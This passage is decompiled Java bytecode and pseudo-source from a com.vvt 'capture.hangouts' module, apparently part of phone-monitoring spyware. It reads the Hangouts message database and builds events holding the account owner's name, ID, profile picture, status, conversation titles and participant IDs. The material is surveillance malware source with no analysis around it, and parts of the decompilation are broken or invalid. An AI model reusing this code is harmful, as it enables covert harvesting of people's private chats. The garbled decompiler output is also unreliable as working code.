    //   1772: astore 51
    //   1774: aload 29
    //   1776: astore 20
    //   1778: aload 51
    //   1780: astore 29
    //   1782: new 462	com/vvt/capture/hangouts/HangoutsData
    //   1785: astore 22
    //   1787: aload 22
    //   1789: invokespecial 463	com/vvt/capture/hangouts/HangoutsData:<init>	()V
    //   1792: aload 18
    //   1794: invokevirtual 466	com/vvt/im/events/MessageType:getNumber	()I
    //   1797: istore 48
    //   1799: aload 22
    //   1801: iload 48
    //   1803: invokevirtual 469	com/vvt/capture/hangouts/HangoutsData:a	(I)V
    //   1806: aload 22
    //   1808: aload 20
    //   1810: invokevirtual 470	com/vvt/capture/hangouts/HangoutsData:a	(Ljava/lang/String;)V
    //   1813: aload 22
    //   1815: aload 41
    //   1817: invokevirtual 471	com/vvt/capture/hangouts/HangoutsData:removeFromPath	(Ljava/lang/String;)V
    //   1820: iload 34
    //   1822: invokestatic 27	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   1825: astore 18
    //   1827: aload 22
    //   1829: aload 18
    //   1831: invokevirtual 472	com/vvt/capture/hangouts/HangoutsData:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   1834: aload 22
    //   1836: aload 40
    //   1838: invokevirtual 475	com/vvt/capture/hangouts/HangoutsData:a	(Lcom/vvt/im/events/info/d;)V
    //   1841: aload 22
    //   1843: aload 43
    //   1845: invokevirtual 478	com/vvt/capture/hangouts/HangoutsData:a	(Ljava/util/List;)V
    //   1848: aload 22
    //   1850: aload 42
    //   1852: invokevirtual 481	com/vvt/capture/hangouts/HangoutsData:a	(Lcom/vvt/im/events/info/f;)V
    //   1855: aload 22
    //   1857: aload 49
    //   1859: invokevirtual 484	com/vvt/capture/hangouts/HangoutsData:a	(Lcom/vvt/im/events/info/removeFromPath;)V
    //   1862: aload 22
    //   1864: lload 38
    //   1866: invokevirtual 486	com/vvt/capture/hangouts/HangoutsData:a	(J)V
    //   1869: aload 22
    //   1871: aload 24
    //   1873: invokevirtual 489	com/vvt/capture/hangouts/HangoutsData:a	(Lcom/vvt/capture/hangouts/HangoutsData$Direction;)V
    //   1876: aload 22
    //   1878: aload 29
    //   1880: invokevirtual 491	com/vvt/capture/hangouts/HangoutsData:removeFromPath	(Ljava/util/List;)V
    //   1883: aload 22
    //   1885: aload 50
    //   1887: invokevirtual 494	com/vvt/capture/hangouts/HangoutsData:a	(Lcom/vvt/im/events/info/MyUncaughtExceptionHandler;)V
    //   1890: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1893: istore 8
    //   1895: iload 8
    //   1897: ifeq +3 -> 1900
    //   1900: aload 9
    //   1902: aload 22
    //   1904: invokevirtual 497	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   1907: pop
    //   1908: dload 15
    //   1910: dstore 30
    //   1912: aload 10
    //   1914: astore 29
    //   1916: dload 11
    //   1918: dstore 32
    //   1920: goto -1078 -> 842
    //   1923: ldc_w 499
    //   1926: astore 29
    //   1928: goto -158 -> 1770
    //   1931: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1934: istore 19
    //   1936: iload 19
    //   1938: ifeq +3 -> 1941
    //   1941: aload 28
    //   1943: astore 20
    //   1945: goto -163 -> 1782
    //   1948: astore 29
    //   1950: iconst_0
    //   1951: istore 8
    //   1953: aconst_null
    //   1954: astore 29
    //   1956: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   1959: istore 48
    //   1961: iload 48
    //   1963: ifeq +3 -> 1966
    //   1966: aload 29
    //   1968: ifnull +10 -> 1978
    //   1971: aload 29
    //   1973: invokeinterface 53 1 0
    //   1978: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1981: istore 8
    //   1983: iload 8
    //   1985: ifeq +3 -> 1988
    //   1988: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1991: istore 8
    //   1993: iload 8
    //   1995: ifeq +3 -> 1998
    //   1998: aload 9
    //   2000: areturn
    //   2001: astore 29
    //   2003: aconst_null
    //   2004: astore 27
    //   2006: aload 27
    //   2008: ifnull +10 -> 2018
    //   2011: aload 27
    //   2013: invokeinterface 53 1 0
    //   2018: aload 29
    //   2020: athrow
    //   2021: aload 27
    //   2023: ifnull -45 -> 1978
    //   2026: aload 27
    //   2028: invokeinterface 53 1 0
    //   2033: goto -55 -> 1978
    //   2036: astore 18
    //   2038: aload 29
    //   2040: astore 27
    //   2042: aload 18
    //   2044: astore 29
    //   2046: goto -40 -> 2006
    //   2049: astore 29
    //   2051: goto -45 -> 2006
    //   2054: astore 18
    //   2056: goto -100 -> 1956
    //   2059: astore 29
    //   2061: aload 27
    //   2063: astore 29
    //   2065: goto -109 -> 1956
    //   2068: aload 20
    //   2070: astore 29
    //   2072: aload 28
    //   2074: astore 20
    //   2076: goto -294 -> 1782
    //   2079: dload 15
    //   2081: dstore 30
    //   2083: aload 10
    //   2085: astore 29
    //   2087: dload 11
    //   2089: dstore 32
    //   2091: goto -1249 -> 842
    //   2094: aload 29
    //   2096: astore 10
    //   2098: goto -700 -> 1398
    //   2101: dload 30
    //   2103: dstore 15
    //   2105: goto -748 -> 1357
    //   2108: dload 32
    //   2110: dstore 11
    //   2112: goto -796 -> 1316
    //   2115: lload 35
    //   2117: lstore 38
    //   2119: goto -1144 -> 975
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	2122	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	2122	1	paramString1	String
    //   0	2122	2	paramLong1	long
    //   0	2122	4	paramLong2	long
    //   0	2122	6	paramString2	String
    //   0	2122	7	paramb	com.vvt.base.removeFromPath
    //   3	1547	8	bool1	boolean
    //   1741	3	8	i	int
    //   1893	101	8	bool2	boolean
    //   13	1986	9	localArrayList	ArrayList
    //   21	2076	10	localObject1	Object
    //   24	2087	11	d1	double
    //   27	1185	13	l1	long
    //   30	2074	15	d2	double
    //   35	980	17	localSimpleDateFormat	java.text.SimpleDateFormat
    //   47	1783	18	localObject2	Object
    //   2036	7	18	localObject3	Object
    //   2054	1	18	localException1	Exception
    //   50	1331	19	j	int
    //   1537	400	19	bool3	boolean
    //   53	2022	20	localObject4	Object
    //   56	740	21	k	int
    //   849	3	21	bool4	boolean
    //   869	226	21	m	int
    //   59	1844	22	localObject5	Object
    //   62	1092	23	n	int
    //   1172	27	23	i1	int
    //   1289	175	23	i2	int
    //   65	1807	24	localObject6	Object
    //   68	1658	25	str1	String
    //   71	1644	26	localObject7	Object
    //   74	1988	27	localObject8	Object
    //   79	1994	28	str2	String
    //   82	1845	29	localObject9	Object
    //   1948	1	29	localException2	Exception
    //   1954	18	29	localObject10	Object
    //   2001	38	29	localObject11	Object
    //   2044	1	29	localObject12	Object
    //   2049	1	29	localObject13	Object
    //   2059	1	29	localException3	Exception
    //   2063	32	29	localObject14	Object
    //   827	1275	30	d3	double
    //   831	1278	32	d4	double
    //   880	941	34	i3	int
    //   934	1182	35	l2	long
    //   947	3	37	bool5	boolean
    //   1192	7	37	i4	int
    //   1268	3	37	bool6	boolean
    //   1292	7	37	i5	int
    //   973	1145	38	l3	long
    //   1000	837	40	localObject15	Object
    //   1021	795	41	str3	String
    //   1048	803	42	localObject16	Object
    //   1075	769	43	localObject17	Object
    //   1128	281	44	i6	int
    //   1144	363	45	i7	int
    //   1237	5	46	str4	String
    //   1333	7	47	i8	int
    //   1371	15	48	i9	int
    //   1427	68	48	bool7	boolean
    //   1500	302	48	i10	int
    //   1959	3	48	bool8	boolean
    //   1638	220	49	localb	com.vvt.im.events.info.removeFromPath
    //   1643	243	50	localc	com.vvt.im.events.info.MyUncaughtExceptionHandler
    //   1772	7	51	localObject18	Object
    // Exception table:
    //   from	to	target	type
    //   93	98	1948	java/lang/Exception
    //   93	98	2001	finally
    //   100	103	2036	finally
    //   105	110	2036	finally
    //   117	123	2036	finally
    //   129	134	2036	finally
    //   143	149	2036	finally
    //   156	161	2036	finally
    //   170	176	2036	finally
    //   183	188	2036	finally
    //   197	203	2036	finally
    //   210	215	2036	finally
    //   224	230	2036	finally
    //   237	242	2036	finally
    //   251	257	2036	finally
    //   264	269	2036	finally
    //   278	284	2036	finally
    //   290	295	2036	finally
    //   304	310	2036	finally
    //   322	329	2036	finally
    //   343	348	2036	finally
    //   357	363	2036	finally
    //   370	377	2036	finally
    //   391	396	2036	finally
    //   405	411	2036	finally
    //   418	425	2036	finally
    //   439	444	2036	finally
    //   453	459	2036	finally
    //   466	473	2036	finally
    //   487	492	2036	finally
    //   501	507	2036	finally
    //   507	514	2036	finally
    //   521	527	2036	finally
    //   534	540	2036	finally
    //   546	552	2036	finally
    //   559	564	2036	finally
    //   572	577	2036	finally
    //   586	591	2036	finally
    //   599	604	2036	finally
    //   613	619	2036	finally
    //   626	631	2036	finally
    //   640	646	2036	finally
    //   653	658	2036	finally
    //   667	673	2036	finally
    //   680	685	2036	finally
    //   693	698	2036	finally
    //   707	713	2036	finally
    //   720	726	2036	finally
    //   726	731	2036	finally
    //   736	741	2036	finally
    //   749	753	2036	finally
    //   758	761	2036	finally
    //   764	769	2036	finally
    //   775	778	2036	finally
    //   786	791	2036	finally
    //   797	800	2036	finally
    //   803	808	2036	finally
    //   1956	1959	2036	finally
    //   810	813	2049	finally
    //   842	849	2049	finally
    //   862	869	2049	finally
    //   873	880	2049	finally
    //   889	896	2049	finally
    //   900	907	2049	finally
    //   916	923	2049	finally
    //   927	934	2049	finally
    //   966	969	2049	finally
    //   982	989	2049	finally
    //   993	1000	2049	finally
    //   1002	1005	2049	finally
    //   1009	1014	2049	finally
    //   1016	1021	2049	finally
    //   1030	1037	2049	finally
    //   1041	1048	2049	finally
    //   1057	1064	2049	finally
    //   1068	1075	2049	finally
    //   1083	1090	2049	finally
    //   1094	1101	2049	finally
    //   1110	1117	2049	finally
    //   1121	1128	2049	finally
    //   1137	1144	2049	finally
    //   1158	1165	2049	finally
    //   1167	1172	2049	finally
    //   1211	1216	2049	finally
    //   1216	1219	2049	finally
    //   1221	1226	2049	finally
    //   1228	1233	2049	finally
    //   1241	1246	2049	finally
    //   1248	1253	2049	finally
    //   1257	1261	2049	finally
    //   1263	1268	2049	finally
    //   1282	1289	2049	finally
    //   1303	1310	2049	finally
    //   1323	1330	2049	finally
    //   1344	1351	2049	finally
    //   1364	1371	2049	finally
    //   1385	1392	2049	finally
    //   1398	1401	2049	finally
    //   1403	1408	2049	finally
    //   1408	1413	2049	finally
    //   1422	1427	2049	finally
    //   1434	1437	2049	finally
    //   1468	1473	2049	finally
    //   1475	1480	2049	finally
    //   1482	1487	2049	finally
    //   1489	1492	2049	finally
    //   1513	1518	2049	finally
    //   1520	1523	2049	finally
    //   1532	1537	2049	finally
    //   1544	1547	2049	finally
    //   1574	1577	2049	finally
    //   1582	1585	2049	finally
    //   1592	1597	2049	finally
    //   1600	1605	2049	finally
    //   1607	1610	2049	finally
    //   1612	1617	2049	finally
    //   1621	1626	2049	finally
    //   1634	1638	2049	finally
    //   1640	1643	2049	finally
    //   1645	1650	2049	finally
    //   1652	1657	2049	finally
    //   1659	1664	2049	finally
    //   1666	1671	2049	finally
    //   1671	1676	2049	finally
    //   1690	1695	2049	finally
    //   1702	1707	2049	finally
    //   1727	1732	2049	finally
    //   1734	1741	2049	finally
    //   1748	1751	2049	finally
    //   1753	1756	2049	finally
    //   1782	1785	2049	finally
    //   1787	1792	2049	finally
    //   1792	1797	2049	finally
    //   1801	1806	2049	finally
    //   1808	1813	2049	finally
    //   1815	1820	2049	finally
    //   1820	1825	2049	finally
    //   1829	1834	2049	finally
    //   1836	1841	2049	finally
    //   1843	1848	2049	finally
    //   1850	1855	2049	finally
    //   1857	1862	2049	finally
    //   1864	1869	2049	finally
    //   1871	1876	2049	finally
    //   1878	1883	2049	finally
    //   1885	1890	2049	finally
    //   1890	1893	2049	finally
    //   1902	1908	2049	finally
    //   1931	1934	2049	finally
    //   100	103	2054	java/lang/Exception
    //   105	110	2054	java/lang/Exception
    //   117	123	2054	java/lang/Exception
    //   129	134	2054	java/lang/Exception
    //   143	149	2054	java/lang/Exception
    //   156	161	2054	java/lang/Exception
    //   170	176	2054	java/lang/Exception
    //   183	188	2054	java/lang/Exception
    //   197	203	2054	java/lang/Exception
    //   210	215	2054	java/lang/Exception
    //   224	230	2054	java/lang/Exception
    //   237	242	2054	java/lang/Exception
    //   251	257	2054	java/lang/Exception
    //   264	269	2054	java/lang/Exception
    //   278	284	2054	java/lang/Exception
    //   290	295	2054	java/lang/Exception
    //   304	310	2054	java/lang/Exception
    //   322	329	2054	java/lang/Exception
    //   343	348	2054	java/lang/Exception
    //   357	363	2054	java/lang/Exception
    //   370	377	2054	java/lang/Exception
    //   391	396	2054	java/lang/Exception
    //   405	411	2054	java/lang/Exception
    //   418	425	2054	java/lang/Exception
    //   439	444	2054	java/lang/Exception
    //   453	459	2054	java/lang/Exception
    //   466	473	2054	java/lang/Exception
    //   487	492	2054	java/lang/Exception
    //   501	507	2054	java/lang/Exception
    //   507	514	2054	java/lang/Exception
    //   521	527	2054	java/lang/Exception
    //   534	540	2054	java/lang/Exception
    //   546	552	2054	java/lang/Exception
    //   559	564	2054	java/lang/Exception
    //   572	577	2054	java/lang/Exception
    //   586	591	2054	java/lang/Exception
    //   599	604	2054	java/lang/Exception
    //   613	619	2054	java/lang/Exception
    //   626	631	2054	java/lang/Exception
    //   640	646	2054	java/lang/Exception
    //   653	658	2054	java/lang/Exception
    //   667	673	2054	java/lang/Exception
    //   680	685	2054	java/lang/Exception
    //   693	698	2054	java/lang/Exception
    //   707	713	2054	java/lang/Exception
    //   720	726	2054	java/lang/Exception
    //   726	731	2054	java/lang/Exception
    //   736	741	2054	java/lang/Exception
    //   749	753	2054	java/lang/Exception
    //   758	761	2054	java/lang/Exception
    //   764	769	2054	java/lang/Exception
    //   775	778	2054	java/lang/Exception
    //   786	791	2054	java/lang/Exception
    //   797	800	2054	java/lang/Exception
    //   803	808	2054	java/lang/Exception
    //   810	813	2059	java/lang/Exception
    //   842	849	2059	java/lang/Exception
    //   862	869	2059	java/lang/Exception
    //   873	880	2059	java/lang/Exception
    //   889	896	2059	java/lang/Exception
    //   900	907	2059	java/lang/Exception
    //   916	923	2059	java/lang/Exception
    //   927	934	2059	java/lang/Exception
    //   966	969	2059	java/lang/Exception
    //   982	989	2059	java/lang/Exception
    //   993	1000	2059	java/lang/Exception
    //   1002	1005	2059	java/lang/Exception
    //   1009	1014	2059	java/lang/Exception
    //   1016	1021	2059	java/lang/Exception
    //   1030	1037	2059	java/lang/Exception
    //   1041	1048	2059	java/lang/Exception
    //   1057	1064	2059	java/lang/Exception
    //   1068	1075	2059	java/lang/Exception
    //   1083	1090	2059	java/lang/Exception
    //   1094	1101	2059	java/lang/Exception
    //   1110	1117	2059	java/lang/Exception
    //   1121	1128	2059	java/lang/Exception
    //   1137	1144	2059	java/lang/Exception
    //   1158	1165	2059	java/lang/Exception
    //   1167	1172	2059	java/lang/Exception
    //   1211	1216	2059	java/lang/Exception
    //   1216	1219	2059	java/lang/Exception
    //   1221	1226	2059	java/lang/Exception
    //   1228	1233	2059	java/lang/Exception
    //   1241	1246	2059	java/lang/Exception
    //   1248	1253	2059	java/lang/Exception
    //   1257	1261	2059	java/lang/Exception
    //   1263	1268	2059	java/lang/Exception
    //   1282	1289	2059	java/lang/Exception
    //   1303	1310	2059	java/lang/Exception
    //   1323	1330	2059	java/lang/Exception
    //   1344	1351	2059	java/lang/Exception
    //   1364	1371	2059	java/lang/Exception
    //   1385	1392	2059	java/lang/Exception
    //   1398	1401	2059	java/lang/Exception
    //   1403	1408	2059	java/lang/Exception
    //   1408	1413	2059	java/lang/Exception
    //   1422	1427	2059	java/lang/Exception
    //   1434	1437	2059	java/lang/Exception
    //   1468	1473	2059	java/lang/Exception
    //   1475	1480	2059	java/lang/Exception
    //   1482	1487	2059	java/lang/Exception
    //   1489	1492	2059	java/lang/Exception
    //   1513	1518	2059	java/lang/Exception
    //   1520	1523	2059	java/lang/Exception
    //   1532	1537	2059	java/lang/Exception
    //   1544	1547	2059	java/lang/Exception
    //   1574	1577	2059	java/lang/Exception
    //   1582	1585	2059	java/lang/Exception
    //   1592	1597	2059	java/lang/Exception
    //   1600	1605	2059	java/lang/Exception
    //   1607	1610	2059	java/lang/Exception
    //   1612	1617	2059	java/lang/Exception
    //   1621	1626	2059	java/lang/Exception
    //   1634	1638	2059	java/lang/Exception
    //   1640	1643	2059	java/lang/Exception
    //   1645	1650	2059	java/lang/Exception
    //   1652	1657	2059	java/lang/Exception
    //   1659	1664	2059	java/lang/Exception
    //   1666	1671	2059	java/lang/Exception
    //   1671	1676	2059	java/lang/Exception
    //   1690	1695	2059	java/lang/Exception
    //   1702	1707	2059	java/lang/Exception
    //   1727	1732	2059	java/lang/Exception
    //   1734	1741	2059	java/lang/Exception
    //   1748	1751	2059	java/lang/Exception
    //   1753	1756	2059	java/lang/Exception
    //   1782	1785	2059	java/lang/Exception
    //   1787	1792	2059	java/lang/Exception
    //   1792	1797	2059	java/lang/Exception
    //   1801	1806	2059	java/lang/Exception
    //   1808	1813	2059	java/lang/Exception
    //   1815	1820	2059	java/lang/Exception
    //   1820	1825	2059	java/lang/Exception
    //   1829	1834	2059	java/lang/Exception
    //   1836	1841	2059	java/lang/Exception
    //   1843	1848	2059	java/lang/Exception
    //   1850	1855	2059	java/lang/Exception
    //   1857	1862	2059	java/lang/Exception
    //   1864	1869	2059	java/lang/Exception
    //   1871	1876	2059	java/lang/Exception
    //   1878	1883	2059	java/lang/Exception
    //   1885	1890	2059	java/lang/Exception
    //   1890	1893	2059	java/lang/Exception
    //   1902	1908	2059	java/lang/Exception
    //   1931	1934	2059	java/lang/Exception
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, String paramString3, com.vvt.base.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = null;
    int i = 17;
    for (;;)
    {
      try
      {
        SQLiteDatabase localSQLiteDatabase = com.vvt.p.c.a(i, paramString1);
        if (localSQLiteDatabase != null) {
          localObject1 = paramString2;
        }
        boolean bool2;
        Object localObject3;
        localObject1 = localArrayList;
      }
      finally
      {
        try
        {
          localObject1 = a(localSQLiteDatabase, paramString2, paramLong1, paramLong2, paramString3, paramb);
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
          bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          localObject1 = localObject2;
          localObject3 = localObject4;
        }
        localObject2 = finally;
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
      }
    }
  }
  
  /* Error */
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, com.vvt.im.events.info.d paramd)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: iconst_0
    //   7: istore 6
    //   9: aconst_null
    //   10: astore 7
    //   12: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   15: istore 8
    //   17: iload 8
    //   19: ifeq +3 -> 22
    //   22: new 306	java/util/ArrayList
    //   25: astore 9
    //   27: aload 9
    //   29: invokespecial 307	java/util/ArrayList:<init>	()V
    //   32: ldc -96
    //   34: astore 10
    //   36: ldc -96
    //   38: astore 11
    //   40: iconst_1
    //   41: anewarray 4	java/lang/Object
    //   44: astore 12
    //   46: aload 12
    //   48: iconst_0
    //   49: aload_2
    //   50: aastore
    //   51: ldc_w 504
    //   54: aload 12
    //   56: invokestatic 221	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   59: astore 13
    //   61: iconst_0
    //   62: istore 14
    //   64: aconst_null
    //   65: astore 12
    //   67: aload_0
    //   68: aload 13
    //   70: aconst_null
    //   71: invokevirtual 225	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   74: astore 7
    //   76: aload 7
    //   78: invokeinterface 70 1 0
    //   83: istore 15
    //   85: iload 15
    //   87: ifeq +287 -> 374
    //   90: ldc_w 506
    //   93: astore 13
    //   95: aload 7
    //   97: aload 13
    //   99: invokeinterface 45 2 0
    //   104: istore 15
    //   106: aload 7
    //   108: iload 15
    //   110: invokeinterface 233 2 0
    //   115: astore 13
    //   117: ldc_w 508
    //   120: astore 12
    //   122: aload 7
    //   124: aload 12
    //   126: invokeinterface 45 2 0
    //   131: istore 14
    //   133: aload 7
    //   135: iload 14
    //   137: invokeinterface 233 2 0
    //   142: astore 12
    //   144: ldc -26
    //   146: astore 5
    //   148: aload 7
    //   150: aload 5
    //   152: invokeinterface 45 2 0
    //   157: istore 4
    //   159: aload 7
    //   161: iload 4
    //   163: invokeinterface 233 2 0
    //   168: astore 5
    //   170: aload_3
    //   171: invokevirtual 123	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
    //   174: astore 16
    //   176: aload 16
    //   178: aload 13
    //   180: invokevirtual 128	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   183: istore 17
    //   185: iload 17
    //   187: ifne -111 -> 76
    //   190: aload 5
    //   192: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   195: istore 17
    //   197: iload 17
    //   199: ifne +20 -> 219
    //   202: aload 5
    //   204: invokestatic 201	com/vvt/capture/hangouts/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   207: astore 10
    //   209: aload 13
    //   211: aload 10
    //   213: aload_1
    //   214: invokestatic 204	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   217: astore 10
    //   219: new 115	com/vvt/im/events/info/e
    //   222: astore 5
    //   224: aload 5
    //   226: invokespecial 509	com/vvt/im/events/info/e:<init>	()V
    //   229: aload 5
    //   231: aload 13
    //   233: invokevirtual 510	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   236: aload 5
    //   238: aload 12
    //   240: invokevirtual 511	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   243: iconst_0
    //   244: istore 15
    //   246: aconst_null
    //   247: astore 13
    //   249: aload 5
    //   251: aconst_null
    //   252: invokevirtual 512	com/vvt/im/events/info/e:removeFromPath	(Ljava/lang/String;)V
    //   255: aload 5
    //   257: aload 10
    //   259: invokevirtual 513	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   262: iconst_0
    //   263: istore 15
    //   265: aconst_null
    //   266: astore 13
    //   268: iconst_0
    //   269: newarray <illegal type>
    //   271: astore 13
    //   273: aload 5
    //   275: aload 13
    //   277: invokevirtual 514	com/vvt/im/events/info/e:a	([B)V
    //   280: aload 5
    //   282: aload 11
    //   284: invokevirtual 516	com/vvt/im/events/info/e:e	(Ljava/lang/String;)V
    //   287: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   290: istore 15
    //   292: iload 15
    //   294: ifeq +3 -> 297
    //   297: aload 9
    //   299: aload 5
    //   301: invokeinterface 517 2 0
    //   306: pop
    //   307: goto -231 -> 76
    //   310: astore 10
    //   312: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   315: istore 8
    //   317: iload 8
    //   319: ifeq +3 -> 322
    //   322: aload 7
    //   324: ifnull +10 -> 334
    //   327: aload 7
    //   329: invokeinterface 53 1 0
    //   334: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   337: istore 6
    //   339: iload 6
    //   341: ifeq +3 -> 344
    //   344: aload 9
    //   346: areturn
    //   347: astore 18
    //   349: iconst_0
    //   350: istore 8
    //   352: aconst_null
    //   353: astore 10
    //   355: aload 18
    //   357: astore 7
    //   359: aload 10
    //   361: ifnull +10 -> 371
    //   364: aload 10
    //   366: invokeinterface 53 1 0
    //   371: aload 7
    //   373: athrow
    //   374: aload 7
    //   376: ifnull -42 -> 334
    //   379: goto -52 -> 327
    //   382: astore 18
    //   384: aload 7
    //   386: astore 10
    //   388: aload 18
    //   390: astore 7
    //   392: goto -33 -> 359
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	395	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	395	1	paramString1	String
    //   0	395	2	paramString2	String
    //   0	395	3	paramd	com.vvt.im.events.info.d
    //   1	161	4	i	int
    //   4	296	5	localObject1	Object
    //   7	333	6	bool1	boolean
    //   10	381	7	localObject2	Object
    //   15	336	8	bool2	boolean
    //   25	320	9	localArrayList	ArrayList
    //   34	224	10	str1	String
    //   310	1	10	localException	Exception
    //   353	34	10	localObject3	Object
    //   38	245	11	str2	String
    //   44	195	12	localObject4	Object
    //   59	217	13	localObject5	Object
    //   62	74	14	j	int
    //   83	3	15	bool3	boolean
    //   104	160	15	k	int
    //   290	3	15	bool4	boolean
    //   174	3	16	str3	String
    //   183	15	17	bool5	boolean
    //   347	9	18	localObject6	Object
    //   382	7	18	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   70	74	310	java/lang/Exception
    //   76	83	310	java/lang/Exception
    //   97	104	310	java/lang/Exception
    //   108	115	310	java/lang/Exception
    //   124	131	310	java/lang/Exception
    //   135	142	310	java/lang/Exception
    //   150	157	310	java/lang/Exception
    //   161	168	310	java/lang/Exception
    //   170	174	310	java/lang/Exception
    //   178	183	310	java/lang/Exception
    //   190	195	310	java/lang/Exception
    //   202	207	310	java/lang/Exception
    //   213	217	310	java/lang/Exception
    //   219	222	310	java/lang/Exception
    //   224	229	310	java/lang/Exception
    //   231	236	310	java/lang/Exception
    //   238	243	310	java/lang/Exception
    //   251	255	310	java/lang/Exception
    //   257	262	310	java/lang/Exception
    //   268	271	310	java/lang/Exception
    //   275	280	310	java/lang/Exception
    //   282	287	310	java/lang/Exception
    //   287	290	310	java/lang/Exception
    //   299	307	310	java/lang/Exception
    //   70	74	347	finally
    //   76	83	382	finally
    //   97	104	382	finally
    //   108	115	382	finally
    //   124	131	382	finally
    //   135	142	382	finally
    //   150	157	382	finally
    //   161	168	382	finally
    //   170	174	382	finally
    //   178	183	382	finally
    //   190	195	382	finally
    //   202	207	382	finally
    //   213	217	382	finally
    //   219	222	382	finally
    //   224	229	382	finally
    //   231	236	382	finally
    //   238	243	382	finally
    //   251	255	382	finally
    //   257	262	382	finally
    //   268	271	382	finally
    //   275	280	382	finally
    //   282	287	382	finally
    //   287	290	382	finally
    //   299	307	382	finally
    //   312	315	382	finally
  }
  
  static List a(HangoutsData paramHangoutsData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramHangoutsData.a();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.HANGOUT.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramHangoutsData.e().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramHangoutsData.e().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramHangoutsData.e().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramHangoutsData.e().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramHangoutsData.e().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramHangoutsData.h().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramHangoutsData.h().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramHangoutsData.h().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramHangoutsData.h().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramHangoutsData.h().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramHangoutsData.a();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.HANGOUT.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramHangoutsData.e().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramHangoutsData.d();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramHangoutsData.e().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (!bool4)
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramHangoutsData.d();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramHangoutsData.e().b();
